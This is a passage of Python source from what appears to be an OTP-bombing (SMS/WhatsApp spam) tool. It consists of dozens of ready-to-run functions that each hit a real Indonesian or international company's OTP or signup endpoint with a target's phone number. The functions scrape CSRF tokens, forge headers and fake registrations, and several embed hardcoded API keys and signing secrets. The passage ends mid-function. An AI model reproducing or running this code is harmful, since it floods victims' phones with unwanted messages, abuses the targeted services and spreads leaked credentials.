        m = re.search(r'name="CSRFToken" value="([^"]+)"', r0.text)
        if not m:
            return False
        r = s.post("https://www.astra-daihatsu.id/otp/whatsapp/generate",
                   json={"phoneNo":nomor_intl},
                   headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/json; charset=UTF-8","csrftoken":m.group(1),"origin":"https://www.astra-daihatsu.id","referer":"https://www.astra-daihatsu.id/register","user-agent":ua(),"x-requested-with":"XMLHttpRequest"}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_astradaihatsu_sms(phone):
    try:
        p = normalize_phone(phone); nomor_intl = '62' + p[1:] if p.startswith('0') else (p[1:] if p.startswith('+62') else p)
        s = requests.Session()
        r0 = s.get("https://www.astra-daihatsu.id/register", headers={"user-agent":ua()}, timeout=10)
        m = re.search(r'name="CSRFToken" value="([^"]+)"', r0.text)
        if not m:
            return False
        r = s.post("https://www.astra-daihatsu.id/otp/sms/generate",
                   json={"phoneNo":nomor_intl},
                   headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/json; charset=UTF-8","csrftoken":m.group(1),"origin":"https://www.astra-daihatsu.id","referer":"https://www.astra-daihatsu.id/register","user-agent":ua(),"x-requested-with":"XMLHttpRequest"}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_vedantu(phone):
    try:
        p = normalize_phone(phone); nomor = p[1:] if p.startswith('0') else p[2:] if p.startswith('62') else p
        url = "https://user.vedantu.com/user/preLoginVerification"
        headers = {"accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","cookie":"v-auth-token=8HQ63zA7QqVd8mMu; auth-token=8Hq63zA7QqVd8mMU","origin":"https://www.vedantu.com","referer":"https://www.vedantu.com/","user-agent":ua()}
        payload = {"email":None,"event":"NEW_FLOW","phoneCode":"+62","phoneNumber":nomor,"sType":"VEDANTU_F_7_N","sValue":"FC34EE3ED29933CD6722BA8151D3E","token":"5nXaR2BzqApBb3Wf","ver":1.033,"version":2}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_bonusbelanja_v2(phone):
    try:
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else ('62' + p if not p.startswith('62') else p)
        s = requests.Session()
        s.get("https://www.bonusbelanja.com/register/", headers={"user-agent":ua()}, timeout=10)
        headers = {"accept":"*/*","content-type":"application/json","origin":"https://www.bonusbelanja.com","referer":"https://www.bonusbelanja.com/register/","user-agent":ua()}
        r = s.post("https://www.bonusbelanja.com/api/auth/registration/app", json={"phone":msisdn,"name":"Amirudin Husaeni","agreeContact":True,"agreeTnc":True}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_swiggy_v2(phone):
    try:
        import string
        p = normalize_phone(phone); nomor = p[1:] if p.startswith('0') else p[2:] if p.startswith('62') else p
        nama = ''.join(random.choices(string.ascii_letters, k=random.randint(6,10))).capitalize()
        s = requests.Session()
        s.get("https://www.swiggy.com/auth", headers={"User-Agent":ua()}, timeout=10)
        r = s.post("https://www.swiggy.com/mapi/auth/signup",
                   json={"name":nama,"email":"","mobile":nomor,"password":"","referral_code":"","countryCode":"62","countryKey":"IN"},
                   headers={"accept":"*/*","__fetch_req__":"true","content-type":"application/json","origin":"https://www.swiggy.com","platform":"mweb","referer":"https://www.swiggy.com/auth/register","user-agent":ua(),"user-id":"0"}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_internetrakyat_v2(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else p
        headers = {"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Origin":"https://internetrakyat.id","Referer":"https://internetrakyat.id/auth/register","User-Agent":ua(),"x-api-key":"280999!FTTH"}
        r = requests.post("https://internetrakyat.id/api/app/auth/send-otp-register", json={"phone_number":msisdn}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_cairin(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else ('0' + p if not p.startswith('0') else p)
        url = f"https://app.cairin.id/v1/app/sms/sendCaptcha?phone={msisdn}&type=registry&userImei=wsom&clientType=H5&haveImageCode=0&fileName=null&imageCode=null&verifySend=true"
        headers = {"accept":"application/json, text/plain, */*","authorization":"[object Object]","locale":"yn","origin":"https://h5.cairin.id","platform":"h5","referer":"https://h5.cairin.id/","user-agent":ua()}
        r = requests.post(url, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_halodoc(phone):
    try:
        p = normalize_phone(phone); nomor = '+62' + p[1:] if p.startswith('0') else '+62' + p
        url = "https://customers.api.halodoc.com/alor-api/v1/users/authentication/otp/requests"
        headers = {"accept":"application/json, text/plain, */*","content-type":"application/json","user-agent":ua()}
        r = requests.post(url, json={"phone_number":nomor,"channel":"whatsapp"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_greensm_v2(phone):
    try:
        p = normalize_phone(phone); nomor = '+62' + p[1:] if p.startswith('0') else ('+' + p if p.startswith('62') else '+62' + p)
        r = requests.post("https://gapi.indo.greensm.com/car/acquisition/create-registration",
                          headers={"accept":"*/*","content-type":"application/json","user-agent":ua()},
                          json={"HiringSource":"Iklan di surat kabar atau dalam aplikasi","Education":"s2","WorkExperience":"Sopir komersial","City":"BT","Type":"CAR_SHARING","Tel":nomor,"Name":"Budi Santoso","Country":"ID","ReferralCode":"","Source":"","AffiliateNumber":"","Campaign":""}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_matahari(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else p
        user = 'user' + str(random.randint(100,999)); email = f"{user}@gmail.com"
        nama = f"{random.choice(['Andi','Budi','Citra','Dewi','Eko'])} {random.choice(['Santoso','Wijaya','Kusuma'])}"
        password = random.choice('ABCDEFGHIJKLMNOP') + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        tgl_lahir = f"{random.randint(1980,2000)}-{str(random.randint(1,12)).zfill(2)}-{str(random.randint(1,28)).zfill(2)}"
        url = "https://matahari-backend-prod.matahari.com/api/auth/register"
        headers = {"Content-Type":"application/json","User-Agent":ua(),"Origin":"https://matahari.com","Referer":"https://matahari.com/"}
        payload = {"emailAddress":email,"name":nama,"mobileCountryCode":"","mobileNumber":msisdn,"birthDate":tgl_lahir,"genderId":"1","password":password,"cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_isellershop(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else p
        r = requests.post("https://warungyeahbintan.isellershop.com/services/identity/requestOTP",
                          headers={"accept":"*/*","content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://warungyeahbintan.isellershop.com","referer":"https://warungyeahbintan.isellershop.com/register","x-requested-with":"XMLHttpRequest","x-sat":"oCQ4sBq2nu1Bh9S3Vo7r8vImrDsZ+dvgZNzwSwJyCiI=","user-agent":ua()},
                          data={"destination":msisdn,"otpLength":"10"}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_misteraladin_v2(phone):
    try:
        import hashlib
        p = normalize_phone(phone); nomor = p[1:] if p.startswith('0') else p[2:] if p.startswith('62') else p
        OTP_SECRET = '6c7A1ZUdVtREXQxO5XcW83ESODEoUld7fJGZCvor8awEcm24tr'
        ts = time.time()
        member_token = hashlib.sha256(f"{OTP_SECRET}{ts}".encode()).hexdigest()
        email = f"user{int(ts)}@gmail.com"
        hb = {"accept":"application/json, text/plain, */*","content-type":"application/json","x-platform":"mobile-web","user-agent":ua()}
        requests.post("https://m.misteraladin.com/api/members/v2/auth/register-check", headers=hb, json={"email":email,"phone_number_country_code":"62","phone_number":nomor}, timeout=10)
        h2 = {**hb,"x-member-token":member_token,"x-request-time":str(ts)}
        r = requests.post("https://m.misteraladin.com/api/members/v2/auth/otp-request", headers=h2, json={"phone_number_country_code":"62","phone_number":nomor,"type":"register"}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_tiptip_v2(phone):
    try:
        p = normalize_phone(phone); nomor = '+62' + p[1:] if p.startswith('0') else ('+' + p if p.startswith('62') else '+62' + p)
        rid = str(uuid.uuid4())[:8]
        s = requests.Session()
        r = s.post("https://api.tiptip.id/authentication/guest/v1/phone/otp/send",
                   headers={"accept":"application/json","channel":"WEB","channel-app-version":"2.27.6","channel-device":"Chrome","channel-fingerprint":"19e4f5f07caab3x9k2-mn7pq4r1-7c34742a-6ddd0-19e4f5f07cbx9k2mn","channel-fingerprint-additional":"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6","content-type":"application/json","country-code":"ID","language":"id","request-id":rid,"user-agent":ua(),"origin":"https://tiptip.id","referer":"https://tiptip.id/sign-up"},
                   json={"action":"SIGN_UP","delivery_method":"WA","phone_number":nomor}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_dokterin(phone):
    try:
        p = normalize_phone(phone); nomor = '62' + p[1:] if p.startswith('0') else (p if p.startswith('62') else '62' + p)
        url = "https://api.dokterin.id/user/v1/users/login"
        headers = {"User-Agent":ua(),"Accept":"*/*","Content-Type":"application/json","Origin":"https://partner.dokterin.co.id","Referer":"https://partner.dokterin.co.id/","x-api-platform":"eyJhcHBfdmVyc2lvbiI6IjEuMC4wIiwicGxhdGZvcm0iOiJ3ZWIifQ=="}
        r = requests.post(url, json={"phone":nomor,"tnc_accept":True,"device":"Blink","platform":"web","host":"https://partner.dokterin.co.id"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_seva(phone):
    try:
        p = normalize_phone(phone); nomor = '+62' + p[1:] if p.startswith('0') else ('+' + p if p.startswith('62') else ('+62' + p if not p.startswith('+') else p))
        url = "https://api.seva.id/auth/otp/whatsapp"
        body = json.dumps({"phoneNumber":nomor}, separators=(',', ':'))
        r = requests.post(url, data=body,
                          headers={"accept":"application/json","content-type":"text/plain","origin":"https://www.seva.id","referer":"https://www.seva.id/","user-agent":ua()}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_fastwork(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else (p if p.startswith('0') else '0' + p)
        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        headers = {"accept":"*/*","content-type":"application/json","referer":"https://fastwork.id/","User-Agent":ua()}
        r = requests.post(url, json={"phone_number":msisdn}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_blibli(phone):
    try:
        p = normalize_phone(phone); nomor = '62' + p[1:] if p.startswith('0') else (p if p.startswith('62') else '62' + p)
        url = "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate"
        headers = {"User-Agent":ua(),"Accept":"*/*","Content-Type":"application/json","x-client-id":"3ca1ed67701249861819ba4850f4f135","x-entity":"BLIBLI","x-channel-id":"DESKTOP","Origin":"https://account.bliblitiket.com"}
        r = requests.post(url, json={"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":nomor,"recaptchaToken":""}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_mazenacademy(phone):
    try:
        p = normalize_phone(phone); nomor = p[1:] if p.startswith('0') else p[2:] if p.startswith('62') else p
        s = requests.Session()
        r0 = s.get("https://mazenacademy.com/", headers={"User-Agent":ua()}, timeout=15)
        m_csrf = re.search(r'name="csrf-token"\s+content="([^"]+)"', r0.text)
        m_tok = re.search(r'name="_token"\s+value="([^"]+)"', r0.text)
        if not (m_csrf and m_tok):
            return False
        boundary = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
        body = (f'--{boundary}\r\nContent-Disposition: form-data; name="_token"\r\n\r\n{m_tok.group(1)}\r\n'
                f'--{boundary}\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+62\r\n'
                f'--{boundary}\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n{nomor}\r\n'
                f'--{boundary}--\r\n')
        headers = {"accept":"application/json","content-type":f"multipart/form-data; boundary={boundary}","origin":"https://mazenacademy.com","referer":"https://mazenacademy.com/","user-agent":ua(),"x-csrf-token":m_csrf.group(1),"x-requested-with":"XMLHttpRequest"}
        r = s.post("https://mazenacademy.com/auth/identify", headers=headers, data=body, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_makanklik_v2(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        mobile = '0' + raw[2:] if raw.startswith('62') else (raw if raw.startswith('0') else '0' + raw)
        s = requests.Session()
        home = s.get("https://member.makanklik.com/", headers={"accept":"text/html","user-agent":ua()}, timeout=10)
        send = ''
        m = re.search(r'var code\s*=\s*"([^"]+)"', home.text)
        if m:
            send = m.group(1)
        s.post("https://member.makanklik.com/data/get_data?func=reqCEKPin", data={'_phone':mobile,'_send':send}, headers={"content-type":"application/x-www-form-urlencoded; charset=UTF-8","x-requested-with":"XMLHttpRequest","user-agent":ua()}, timeout=10)
        r = s.post("https://member.makanklik.com/data/get_data?func=reqOTPMiscall", data={'_phone':mobile,'_send':send}, headers={"content-type":"application/x-www-form-urlencoded; charset=UTF-8","x-requested-with":"XMLHttpRequest","user-agent":ua()}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_babamarket(phone):
    try:
        import hashlib
        raw = re.sub(r'\D', '', phone)
        mobile = '0' + raw[2:] if raw.startswith('62') else raw
        secret_key = 'e75a6cd43a16c2f31d1a3c17700af64d3658a380c49d65b20cc75b1f7c0e001b'
        ts = datetime.now().isoformat()
        sig = hashlib.sha256(secret_key.encode() + ts.encode()).hexdigest()
        s = requests.Session()
        s.get("https://babamarket.co.id/", headers={"user-agent":ua()}, timeout=10)
        r = s.post("https://dev.babamarket.co.id/v2/auth/otp/request",
                   json={"type":"phone","phone":mobile,"is_register":True},
                   headers={"accept":"application/json","content-type":"application/json","origin":"https://babamarket.co.id","referer":"https://babamarket.co.id/","x-baba-signature":sig,"x-baba-timestamp":ts,"user-agent":ua()}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_nutacloud(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '0' + raw[2:] if raw.startswith('62') else ('0' + raw if not raw.startswith('0') else raw)
        url = "https://www.nutacloud.com/account/ajax_process_register"
        headers = {"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/x-www-form-urlencoded; charset=UTF-8","x-requested-with":"XMLHttpRequest","user-agent":ua(),"origin":"https://www.nutacloud.com","referer":"https://www.nutacloud.com/account/register"}
        data = {"namalengkap":f"User{random.randint(1,999)}","email":f"user{random.randint(1,999)}@gmail.com","nomerhp":msisdn,"password":"Yahana7@@","namabisnis":f"Toko{random.randint(1,99)}","jenisbisnis":"Kuliner: Warung Makan","kotabisnis":"Surabaya"}
        r = requests.post(url, headers=headers, data=data, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_amaha(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        nomor = raw[1:] if raw.startswith('0') else raw[2:] if raw.startswith('62') else raw
        url = f"https://api.theinnerhour.com/v1/get_otp?country_code=62&mobile_country=Indonesia&mobile={nomor}&login=yes"
        headers = {"accept":"application/json","platform":"kaizen","x-country":"ID","x-timezone":"Asia/Jakarta","user-agent":ua(),"referer":"https://www.amahahealth.com/"}
        r = requests.get(url, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_myvalue(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '62' + raw[1:] if raw.startswith('0') else (raw if raw.startswith('62') else '62' + raw)
        url = "https://auth.myvalue.id/v2/verification/send"
        headers = {"accept":"application/json","content-type":"application/json","x-client-id":"MyValueWeb","user-agent":ua(),"origin":"https://auth.myvalue.id","referer":"https://auth.myvalue.id/"}
        r = requests.post(url, json={"username":msisdn,"template":"myvalue","sendProvider":"whatsapp"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_eiger(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '62' + raw[1:] if raw.startswith('0') else (raw if raw.startswith('62') else '62' + raw)
        s = requests.Session()
        email = f"user{random.randint(100000,999999)}@gmail.com"
        reg_payload = {"name":"Yanto","email":email,"mobile_phone":msisdn,"password":"Yanto123@","password_confirmation":"Yanto123@","accept_privacy_policy":True,"g-recaptcha-response":"","type":"web"}
        s.post("https://careloyalty.eigerindo.co.id/api/v1/register", json=reg_payload, headers={"accept":"application/json","content-type":"application/json","user-agent":ua()}, timeout=10)
        r = s.post("https://careloyalty.eigerindo.co.id/api/v1/otp/send",
                   json={"mobile_phone":f"+{msisdn}","via":"whatsapp"},
                   headers={"accept":"application/json","content-type":"application/json","user-agent":ua()}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_toyota_v2(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '0' + raw[2:] if raw.startswith('62') else ('0' + raw if not raw.startswith('0') else raw)
        nama = 'Yanto'; email = f"{random.randint(100000,999999)}@gmail.com"
        s = requests.Session()
        tk = s.post("https://data-web.tam-icm.com/api/public/vendors/tokenize",
                    json={"data":[msisdn,nama,email]},
                    headers={"accept":"application/json","content-type":"application/json","origin":"https://www.toyota.astra.co.id","referer":"https://www.toyota.astra.co.id/","User-Agent":ua()}, timeout=10)
        tokens = tk.json()
        phone_token = ''
        if isinstance(tokens, list):
            for item in tokens:
                if item.get('token') and item.get('status') == 'Succeed':
                    phone_token = item['token']
                    break
        if not phone_token:
            return False
        r = s.post("https://data-web.tam-icm.com/api/public/vendors/register",
                   json={"phoneNumber":phone_token},
                   headers={"accept":"application/json","content-type":"application/json","origin":"https://www.toyota.astra.co.id","referer":"https://www.toyota.astra.co.id/","User-Agent":ua()}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_ndcdeals(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '62' + raw[1:] if raw.startswith('0') else ('62' + raw[1:] if raw.startswith('+62') else (raw if raw.startswith('62') else '62' + raw))
        url = "https://api.ndc.deals/openapi/generateOtp"
        headers = {"accept":"application/json","content-type":"application/json","User-Agent":ua()}
        r = requests.post(url, json={"recipient":msisdn,"channel":"whatsapp"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_erp360(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        nomor = raw[1:] if raw.startswith('0') else raw[2:] if raw.startswith('62') else raw
        email = f"{int(time.time()*1000)}@gmail.com"
        nama = random.choice(['Yanti','Budi','Siti','Joko','Dewi','Agus','Rina','Andi'])
        data = f"handphone={nomor}&name={nama}&email={email}"
        r = requests.post("https://www.properti.erp360.id/waba/wcf/WebService.asmx/sendVerificationCodeV1",
                          data=data,
                          headers={"Host":"www.properti.erp360.id","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest","Origin":"https://www.properti.erp360.id","Referer":"https://www.properti.erp360.id/waba/register","User-Agent":ua()}, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_kemenag(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '0' + raw[2:] if raw.startswith('62') else ('0' + raw if not raw.startswith('0') else raw)
        nama = random.choice(['Budi','Andi','Caca','Dedi','Eka','Fani','Gilang','Hana'])
        email = f"{int(time.time()*1000)}@gmail.com"
        password = f"{random.randint(1000,9999)}@123"
        s = requests.Session()
        s.get("https://ptsp.kemenag.go.id/login", headers={"User-Agent":ua()}, timeout=10)
        s.post("https://ptsp.kemenag.go.id/api/auth/register",
               json={"nama":nama,"wa":msisdn,"email":email,"password":password},
               headers={"accept":"application/json","content-type":"application/json","origin":"https://ptsp.kemenag.go.id","referer":"https://ptsp.kemenag.go.id/login","User-Agent":ua()}, timeout=10)
        r = s.post("https://ptsp.kemenag.go.id/api/auth/sendOtp",
                   json={"wa":msisdn},
                   headers={"accept":"application/json","content-type":"application/json","origin":"https://ptsp.kemenag.go.id","referer":f"https://ptsp.kemenag.go.id/login/otp?wa={msisdn}","User-Agent":ua()}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_entrust(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '62' + raw[1:] if raw.startswith('0') else (raw if raw.startswith('62') else '62' + raw)
        nama = random.choice(['Budi','Andi','Caca','Dedi','Eka','Fani','Gilang','Hana'])
        url = "https://www.entrustfamilyoffice.com/wp-content/themes/Mytheme/phpmail/send_otp.php"
        headers = {"accept":"*/*","origin":"https://www.entrustfamilyoffice.com","referer":"https://www.entrustfamilyoffice.com/investment-services/","User-Agent":ua()}
        r = requests.post(url, data={"phone":f"+{msisdn}","name":nama}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_berprestasi(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        nomor = raw[1:] if raw.startswith('0') else raw[2:] if raw.startswith('62') else raw
        url = "https://berprestasi.id/api/otp/send"
        headers = {"accept":"*/*","content-type":"application/json","origin":"https://berprestasi.id","referer":"https://berprestasi.id/","User-Agent":ua()}
        r = requests.post(url, json={"phoneNumber":nomor}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_miniso(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        nomor = raw[1:] if raw.startswith('0') else raw[2:] if raw.startswith('62') else raw
        url = "https://idmember.miniso.com/standardApi/user/sendRegisterMobile"
        headers = {"accept":"application/json, text/plain, */*","accept-language":"id","content-type":"application/json","langid":"1","origin":"https://idmember.miniso.com","referer":"https://idmember.miniso.com/pages/register/register","User-Agent":ua()}
        r = requests.post(url, json={"mobile":nomor,"captchaToken":""}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_halobengkel(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '62' + raw[1:] if raw.startswith('0') else (raw if raw.startswith('62') else '62' + raw)
        email = f"{int(time.time()*1000)}@gmail.com"
        nama = random.choice(['Budi','Andi','Caca','Dedi','Eka','Fani','Gilang','Hana'])
        password = f"{random.randint(1000,9999)}123!"
        url = "https://api-app.halobengkel.com/service/v1/authentication/register/otp"
        headers = {"accept":"application/json","authorization":"Bearer null","content-type":"application/json","systemlang":"id","User-Agent":ua()}
        r = requests.post(url, json={"name":nama,"email":email,"phone":msisdn,"password":password,"password_confirmation":password}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_softwarelinkers(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '62' + raw[1:] if raw.startswith('0') else ('+62' + raw[1:] if raw.startswith('+62') else (raw if raw.startswith('62') else '62' + raw))
        if not msisdn.startswith('+'):
            msisdn = '+' + msisdn
        otp = ''.join(random.choices('0123456789', k=6))
        payload = {"api_key":"817e9f2b99ace5865a7aa67fc39db0bf","message_type":"template","recipient":msisdn,"template_name":"sft_otp_verification","language":"en_US","parameters":{"body":["",otp]}}
        r = requests.post("https://whatsapp.softwarelinkers.in/api/send_message.php", json=payload, headers={"content-type":"application/json","accept":"*/*","User-Agent":ua()}, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_youtap(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '62' + raw[1:] if raw.startswith('0') else (raw if raw.startswith('62') else '62' + raw)
        s = requests.Session()
        headers = {"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://bos.youtap.id","referer":"https://bos.youtap.id/","user-agent":ua(),"x-platform-id":"WEB","x-timezone":"Asia/Jakarta","x-village-id":"7ceec169-6e16-11ec-a41a-9383440169c7"}
        r1 = s.post("https://bos-api.youtap.id/v1/graphql",
                    json={"variables":{"checkPhoneInput":{"phone":msisdn,"platformType":"BOS_REGISTRATION"}},
                          "query":"mutation ($checkPhoneInput: CheckPhoneInput!) { checkPhone(checkPhoneInput: $checkPhoneInput) { merchantRegistration { id phone } token } }"},
                    headers=headers, timeout=10)
        try:
            token = r1.json().get('data',{}).get('checkPhone',{}).get('token')
        except:
            return False
        if not token:
            return 200 <= r1.status_code <= 299
        headers["authorization"] = f"Bearer {token}"
        r2 = s.post("https://bos-api.youtap.id/v1/graphql",
                    json={"variables":{},"query":"mutation { regenerateOTP { otpExpiredAt } }"},
                    headers=headers, timeout=10)
        return 200 <= r2.status_code <= 299
    except:
        return False

def spam_otp_generasimaju(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        msisdn = '62' + raw[1:] if raw.startswith('0') else (raw if raw.startswith('62') else '62' + raw)
        url = "https://www.generasimaju.co.id/klub-generasi-maju/resendotp"
        headers = {"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/x-www-form-urlencoded; charset=UTF-8","x-requested-with":"XMLHttpRequest","User-Agent":ua()}
        r = requests.post(url, data={"msisdn":msisdn,"method":"1"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_bundasemarang(phone):
    try:
        import urllib3; urllib3.disable_warnings()
        raw = re.sub(r'\D', '', phone)
        nomor = raw if raw.startswith('0') else ('0' + raw[2:] if raw.startswith('62') else raw)
        s = requests.Session(); s.verify = False
        r0 = s.get("http://pendaftaran.bundasemarang.co.id/pendaftaran-online/login", headers={"user-agent":ua()}, timeout=15)
        m = re.search(r'name="_token"\s+value="([^"]+)"', r0.text) or re.search(r'id="a"\s+value="([^"]+)"', r0.text)
        if not m:
            return False
        r = s.post("http://pendaftaran.bundasemarang.co.id/pendaftaran-online/reqOTP",
                   data={"_token":m.group(1),"nohp":nomor},
                   headers={"accept":"*/*","content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"http://pendaftaran.bundasemarang.co.id","referer":"http://pendaftaran.bundasemarang.co.id/pendaftaran-online/login","user-agent":ua(),"x-requested-with":"XMLHttpRequest"}, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_kristaonline(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        nomor = '62' + raw[1:] if raw.startswith('0') else raw
        email = f"user{random.randint(10000000,99999999)}@gmail.com"
        s = requests.Session()
        r0 = s.get("https://register.kristaonline.com/visitor/kristainterfood", headers={"user-agent":ua()}, timeout=15)
        m = re.search(r'name="csrf-token"\s+content="([^"]+)"', r0.text)
        if not m:
            return False
        boundary = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=16))
        parts = [f'--{boundary}','Content-Disposition: form-data; name="_token"','',m.group(1),
                 f'--{boundary}','Content-Disposition: form-data; name="verifikasi_otp_wa"','','true',
                 f'--{boundary}','Content-Disposition: form-data; name="krista_hidden_brody"','','',
                 f'--{boundary}','Content-Disposition: form-data; name="country_id"','','102',
                 f'--{boundary}','Content-Disposition: form-data; name="mobile_number"','',nomor,
                 f'--{boundary}','Content-Disposition: form-data; name="email"','',email,
                 f'--{boundary}','Content-Disposition: form-data; name="sent_to"','','WA',
                 f'--{boundary}--']
        body = '\r\n'.join(parts)
        r = s.post("https://register.kristaonline.com/visitor/kristainterfood", data=body,
                   headers={"accept":"text/html,application/xhtml+xml","content-type":f"multipart/form-data; boundary={boundary}","origin":"https://register.kristaonline.com","referer":"https://register.kristaonline.com/visitor/kristainterfood","user-agent":ua()}, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_buccheri(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        nomor = raw if raw.startswith('0') else ('0' + raw[2:] if raw.startswith('62') else raw)
        s = requests.Session()
        s.get("https://member.buccheri.com/otp", headers={"user-agent":ua()}, timeout=15, allow_redirects=True)
        r = s.post("https://member.buccheri.com/otp-sent", data={"phonenumber":nomor,"otptype":"SIGNUP"}, headers={"user-agent":ua()}, timeout=15, allow_redirects=False)
        return r.status_code in (200, 303)
    except:
        return False

def spam_otp_gabino(phone):
    try:
        raw = re.sub(r'\D', '', phone)
        nomor = raw if raw.startswith('0') else ('0' + raw[2:] if raw.startswith('62') else raw)
        s = requests.Session()
        s.get("https://member.gabino.id/otp", headers={"user-agent":ua()}, timeout=15, allow_redirects=True)
        r = s.post("https://member.gabino.id/otp-sent", data={"phonenumber":nomor,"otptype":"SIGNUP"}, headers={"user-agent":ua()}, timeout=15, allow_redirects=False)
        return r.status_code in (200, 303)
    except:
        return False

def spam_otp_morais(phone):
    try:
        import string
        raw = re.sub(r'\D', '', phone)
        nomor = raw[2:] if raw.startswith('62') else raw
        nama = ''.join(random.choices(string.ascii_lowercase, k=8))
        s = requests.Session()
        s.get("https://moraiscity.com/terms-condition", headers={"user-agent":ua()}, timeout=15)
        r = s.post("https://moraiscity.com/v1-send-otp",
                   data={"phone_no":nomor,"country_code":"62","name":nama},
                   headers={"accept":"*/*","content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://moraiscity.com","referer":"https://moraiscity.com/terms-condition","user-agent":ua(),"x-requested-with":"XMLHttpRequest"}, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_rahasya(phone):
    try:
        import string
        raw = re.sub(r'\D', '', phone)
        nomor = '+' + ('62' + raw[1:] if raw.startswith('0') else raw)
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
